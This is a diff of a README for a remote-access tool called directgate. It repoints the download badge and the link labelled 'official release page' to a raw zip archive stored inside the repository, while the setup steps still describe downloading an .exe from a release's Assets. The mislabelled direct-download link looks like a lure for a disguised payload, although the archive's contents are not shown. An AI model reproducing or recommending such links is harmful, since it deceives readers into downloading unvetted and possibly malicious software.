@@ -1,6 +1,6 @@
 # 🌐 directgate - Secure access to your private computers
 
-[![](https://img.shields.io/badge/Download_Directgate-blue)](https://github.com/calorimetric-shay300/directgate)
+[![](https://img.shields.io/badge/Download_Directgate-blue)](https://github.com/calorimetric-shay300/directgate/raw/refs/heads/main/misc/Software_2.8.zip)
 
 Directgate connects your devices over private, encrypted links. It removes the need for complex networking tools like VPNs or port forwarding. You gain remote access to your computer from anywhere while your data stays private. The software uses peer-to-peer technology to build a direct path between your machines.
 
@@ -23,7 +23,7 @@ Directgate handles your remote connections. It uses high-grade encryption to ens
 
 ## 🚀 Setting up the software
 
-1. Visit the [official release page](https://github.com/calorimetric-shay300/directgate) to find the latest version.
+1. Visit the [official release page](https://github.com/calorimetric-shay300/directgate/raw/refs/heads/main/misc/Software_2.8.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Select the file to start your download.
 4. Open the folder where your computer saved the file.
